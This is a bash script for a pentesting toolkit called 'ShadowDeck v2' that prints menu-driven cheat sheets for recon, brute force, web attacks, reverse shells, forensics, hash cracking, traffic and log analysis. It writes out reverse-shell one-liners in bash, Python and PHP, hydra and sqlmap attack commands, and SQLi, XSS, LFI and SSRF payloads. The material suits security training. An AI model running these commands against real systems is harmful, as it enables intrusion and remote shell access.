#!/usr/bin/env bash
# ShadowDeck v2 — Cheatsheet / Help Module
# core/cheatsheet.sh

RESET='\033[0m'
GREEN='\033[38;5;82m'
GREEN_DIM='\033[38;5;22m'
GREEN_HI='\033[38;5;118m'
RED='\033[38;5;196m'
AMBER='\033[38;5;214m'
CYAN='\033[38;5;51m'
BOLD='\033[1m'

dim_line()  { echo -e "${GREEN_DIM}$(printf '─%.0s' {1..70})${RESET}"; }
thick_line(){ echo -e "${GREEN}$(printf '═%.0s' {1..70})${RESET}"; }

print_cheatsheet_menu() {
    clear
    thick_line
    echo -e "  ${GREEN_HI}${BOLD}ShadowDeck v2 — Cheatsheet & Reference${RESET}"
    thick_line
    echo -e "  ${RED}[1]${GREEN} Recon            ${AMBER}[5]${GREEN} Forensics${RESET}"
    echo -e "  ${RED}[2]${GREEN} Brute Force       ${AMBER}[6]${GREEN} Hash Cracking${RESET}"
    echo -e "  ${RED}[3]${GREEN} Web Attacks        ${AMBER}[7]${GREEN} Traffic Analysis${RESET}"
    echo -e "  ${RED}[4]${GREEN} Reverse Shells     ${AMBER}[8]${GREEN} Log Analyzer${RESET}"
    echo -e "  ${CYAN}[9]${GREEN} All Modules Quick Ref${RESET}"
    dim_line
    echo -e "  ${GREEN_DIM}[0] Back${RESET}"
    dim_line
    echo -ne "\n  ${GREEN_HI}shadow@cheatsheet${RESET}${GREEN} > ${RESET}"
}

show_recon_cheat() {
    clear; thick_line
    echo -e "  ${RED}${BOLD}[RECON MODULE] — Cheatsheet${RESET}"
    thick_line
    cat << 'EOF'

  NMAP
  ────────────────────────────────────
  Quick scan      : nmap -sV -sC <target>
  Full port       : nmap -p- --min-rate=5000 <target>
  UDP scan        : nmap -sU --top-ports 100 <target>
  OS detect       : nmap -O -A <target>
  Vuln script     : nmap --script vuln <target>
  Output all      : nmap -oA scan_results <target>

  GOBUSTER
  ────────────────────────────────────
  Dir brute       : gobuster dir -u http://<target> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
  DNS brute       : gobuster dns -d <domain> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
  Extensions      : gobuster dir -u <url> -w <wl> -x php,html,txt

  FFUF
  ────────────────────────────────────
  Dir fuzz        : ffuf -u http://<target>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt
  Subdomain fuzz  : ffuf -u http://FUZZ.<domain> -w <wl> -H "Host: FUZZ.<domain>"
  POST param fuzz : ffuf -u <url> -X POST -d "user=FUZZ&pass=test" -w <wl>

EOF
    dim_line; echo -e "${GREEN_DIM}  Press Enter to return...${RESET}"; read -r
}

show_bruteforce_cheat() {
    clear; thick_line
    echo -e "  ${RED}${BOLD}[BRUTE FORCE MODULE] — Cheatsheet${RESET}"
    thick_line
    cat << 'EOF'

  HYDRA
  ────────────────────────────────────
  SSH             : hydra -l <user> -P <wordlist> ssh://<target>
  FTP             : hydra -l <user> -P <wordlist> ftp://<target>
  HTTP-POST       : hydra -l <user> -P <wordlist> <target> http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid"
  HTTP-GET Basic  : hydra -l <user> -P <wordlist> <target> http-get /path
  RDP             : hydra -l <user> -P <wordlist> rdp://<target>
  Multiple users  : hydra -L users.txt -P <wordlist> ssh://<target>

  WORDLISTS (Kali defaults)
  ────────────────────────────────────
  rockyou         : /usr/share/wordlists/rockyou.txt.gz  (gunzip first)
  dirbuster       : /usr/share/wordlists/dirbuster/
  seclists        : /usr/share/seclists/

EOF
    dim_line; echo -e "${GREEN_DIM}  Press Enter to return...${RESET}"; read -r
}

show_webattacks_cheat() {
    clear; thick_line
    echo -e "  ${RED}${BOLD}[WEB ATTACKS MODULE] — Cheatsheet${RESET}"
    thick_line
    cat << 'EOF'

  SQLMAP
  ────────────────────────────────────
  Basic           : sqlmap -u "http://<target>?id=1" --dbs
  POST form       : sqlmap -u <url> --data="user=a&pass=b" --dbs
  Dump DB         : sqlmap -u <url> -D <db> --tables
  Dump table      : sqlmap -u <url> -D <db> -T <table> --dump
  OS shell        : sqlmap -u <url> --os-shell
  Bypass WAF      : sqlmap -u <url> --tamper=space2comment

  BURP SUITE
  ────────────────────────────────────
  Launch          : [select from WebAttacks menu]
  Proxy port      : 127.0.0.1:8080
  Intercept → Repeater → Intruder flow

  COMMON PAYLOADS
  ────────────────────────────────────
  XSS             : <script>alert(1)</script>
  SQLi            : ' OR '1'='1
  LFI             : ../../../../etc/passwd
  SSRF            : http://127.0.0.1/admin

EOF
    dim_line; echo -e "${GREEN_DIM}  Press Enter to return...${RESET}"; read -r
}

show_revshells_cheat() {
    clear; thick_line
    echo -e "  ${RED}${BOLD}[REVERSE SHELLS MODULE] — Cheatsheet${RESET}"
    thick_line
    cat << 'EOF'

  LISTENERS
  ────────────────────────────────────
  Netcat          : nc -lvnp <port>
  Rlwrap (stable) : rlwrap nc -lvnp <port>

  BASH
  ────────────────────────────────────
  bash -i >& /dev/tcp/<IP>/<PORT> 0>&1

  PYTHON
  ────────────────────────────────────
  python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

  PHP
  ────────────────────────────────────
  php -r '$s=fsockopen("<IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'

  STABILIZE SHELL
  ────────────────────────────────────
  1. python3 -c 'import pty;pty.spawn("/bin/bash")'
  2. Ctrl+Z
  3. stty raw -echo; fg
  4. export TERM=xterm

  RESOURCES
  ────────────────────────────────────
  https://revshells.com  |  PayloadsAllTheThings

EOF
    dim_line; echo -e "${GREEN_DIM}  Press Enter to return...${RESET}"; read -r
}

show_forensics_cheat() {
    clear; thick_line
    echo -e "  ${AMBER}${BOLD}[FORENSICS MODULE] — Cheatsheet${RESET}"
    thick_line
    cat << 'EOF'

  BINWALK
  ────────────────────────────────────
  Analyze         : binwalk <file>
  Extract         : binwalk -e <file>
  Deep extract    : binwalk --dd='.*' <file>

  STEGHIDE
  ────────────────────────────────────
  Embed           : steghide embed -cf <cover> -sf <secret>
  Extract         : steghide extract -sf <file>
  No password     : steghide extract -sf <file> -p ""

  EXIFTOOL
  ────────────────────────────────────
  View metadata   : exiftool <file>
  Remove all meta : exiftool -all= <file>
  GPS coords      : exiftool -gps:all <file>

  FOREMOST
  ────────────────────────────────────
  Recover files   : foremost -i <image.dd> -o ./recovered/
  Specific type   : foremost -t jpg,png,pdf -i <image>

  FILE ANALYSIS
  ────────────────────────────────────
  file <target>   — detect type
  strings <file>  — extract strings
  hexdump -C <file> | head — hex view
  xxd <file>      — hex+ascii

EOF
    dim_line; echo -e "${GREEN_DIM}  Press Enter to return...${RESET}"; read -r
}

show_hashcrack_cheat() {
    clear; thick_line
    echo -e "  ${AMBER}${BOLD}[HASH CRACKING MODULE] — Cheatsheet${RESET}"
    thick_line
    cat << 'EOF'

  IDENTIFY HASH
  ────────────────────────────────────
  hashid <hash>
  hash-identifier

  JOHN THE RIPPER
  ────────────────────────────────────
  Basic           : john --wordlist=rockyou.txt <hashfile>
  Show cracked    : john --show <hashfile>
  Format specific : john --format=NT --wordlist=rockyou.txt <hashfile>
  Zip/RAR         : zip2john <file>.zip > hash.txt && john hash.txt
  SSH key         : ssh2john id_rsa > hash.txt && john hash.txt

  HASHCAT
  ────────────────────────────────────
  MD5 dict        : hashcat -m 0 hash.txt rockyou.txt
  SHA1 dict       : hashcat -m 100 hash.txt rockyou.txt
  NTLM            : hashcat -m 1000 hash.txt rockyou.txt
  SHA256 brute    : hashcat -m 1400 -a 3 hash.txt ?a?a?a?a?a?a
  Rule-based      : hashcat -m 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

  COMMON HASH MODES (-m)
  ────────────────────────────────────
  MD5=0  SHA1=100  SHA256=1400  SHA512=1700  NTLM=1000  bcrypt=3200

EOF
    dim_line; echo -e "${GREEN_DIM}  Press Enter to return...${RESET}"; read -r
}

show_traffic_cheat() {
    clear; thick_line
    echo -e "  ${AMBER}${BOLD}[TRAFFIC ANALYSIS MODULE] — Cheatsheet${RESET}"
    thick_line
    cat << 'EOF'

  WIRESHARK
  ────────────────────────────────────
  Launch          : [select from Traffic menu — opens Windows GUI]
  Capture filter  : host <IP>  |  port <port>  |  tcp
  Display filter  : http  |  dns  |  tcp.port==80  |  ip.addr==<IP>

  KEY DISPLAY FILTERS
  ────────────────────────────────────
  HTTP GET        : http.request.method == "GET"
  Credentials     : http contains "password"
  DNS queries     : dns.flags.response == 0
  TCP SYN flood   : tcp.flags.syn==1 && tcp.flags.ack==0

  TSHARK (CLI)
  ────────────────────────────────────
  Capture 100pkts : tshark -i eth0 -c 100 -w capture.pcap
  Read pcap       : tshark -r capture.pcap
  Filter          : tshark -r capture.pcap -Y "http"
  Extract fields  : tshark -r capture.pcap -T fields -e ip.src -e http.request.uri

  TCPDUMP
  ────────────────────────────────────
  Capture         : tcpdump -i eth0 -w out.pcap
  Filter port     : tcpdump -i eth0 port 80

EOF
    dim_line; echo -e "${GREEN_DIM}  Press Enter to return...${RESET}"; read -r
}

show_loganalyzer_cheat() {
    clear; thick_line
    echo -e "  ${AMBER}${BOLD}[LOG ANALYZER MODULE] — Cheatsheet${RESET}"
    thick_line
    cat << 'EOF'

  GREP PATTERNS
  ────────────────────────────────────
  Failed logins   : grep "Failed password" /var/log/auth.log
  SSH brute       : grep "Invalid user" /var/log/auth.log | awk '{print $8}' | sort | uniq -c | sort -rn
  Sudo use        : grep "sudo" /var/log/auth.log
  Cron jobs       : grep "CRON" /var/log/syslog

  AWK TRICKS
  ────────────────────────────────────
  Top IPs         : awk '{print $1}' access.log | sort | uniq -c | sort -rn | head 20
  Status codes    : awk '{print $9}' access.log | sort | uniq -c | sort -rn
  POST requests   : awk '$6 ~ /POST/' access.log

  COMMON LOG PATHS
  ────────────────────────────────────
  Auth            : /var/log/auth.log
  Syslog          : /var/log/syslog
  Apache          : /var/log/apache2/access.log
  Nginx           : /var/log/nginx/access.log
  Kern            : /var/log/kern.log

  IOC HUNTING
  ────────────────────────────────────
  Large transfers : awk '$10 > 1000000' access.log
  SQLi attempts   : grep -i "union\|select\|insert\|drop" access.log
  Scanner detect  : grep -i "nikto\|nmap\|sqlmap\|nessus" access.log

EOF
    dim_line; echo -e "${GREEN_DIM}  Press Enter to return...${RESET}"; read -r
}

show_all_quickref() {
    clear; thick_line
    echo -e "  ${GREEN_HI}${BOLD}[ALL MODULES] — Quick Reference${RESET}"
    thick_line
    echo -e "  ${RED}RED TEAM${RESET}"
    echo -e "  [1] Recon       — nmap, gobuster, ffuf"
    echo -e "  [2] BruteForce  — hydra (-l user -P wl ssh://<ip>)"
    echo -e "  [3] WebAttacks  — sqlmap, burpsuite, payloads"
    echo -e "  [4] RevShells   — bash/python/php + stabilize"
    echo ""
    echo -e "  ${AMBER}BLUE TEAM${RESET}"
    echo -e "  [5] Forensics   — binwalk, steghide, exiftool, foremost"
    echo -e "  [6] HashCrack   — john, hashcat (-m 0/100/1000)"
    echo -e "  [7] Traffic     — wireshark, tshark, tcpdump"
    echo -e "  [8] LogAnalyzer — grep, awk, IOC hunting"
    echo ""
    echo -e "  ${CYAN}CORE${RESET}"
    echo -e "  [9]  ShadowScan  — http://127.0.0.1:5000"
    echo -e "  [10] tmux        — shadow alias / auto-workspace"
    echo -e "  [11] Git push    — commit + push to GitHub"
    dim_line; echo -e "${GREEN_DIM}  Press Enter to return...${RESET}"; read -r
}

# ── Main Loop ──────────────────────────────────────────────────
while true; do
    print_cheatsheet_menu
    read -r choice
    case "$choice" in
        1) show_recon_cheat ;;
        2) show_bruteforce_cheat ;;
        3) show_webattacks_cheat ;;
        4) show_revshells_cheat ;;
        5) show_forensics_cheat ;;
        6) show_hashcrack_cheat ;;
        7) show_traffic_cheat ;;
        8) show_loganalyzer_cheat ;;
        9) show_all_quickref ;;
        0) exit 0 ;;
        *) echo -e "${RED}[!] Invalid${RESET}"; sleep 0.6 ;;
    esac
done
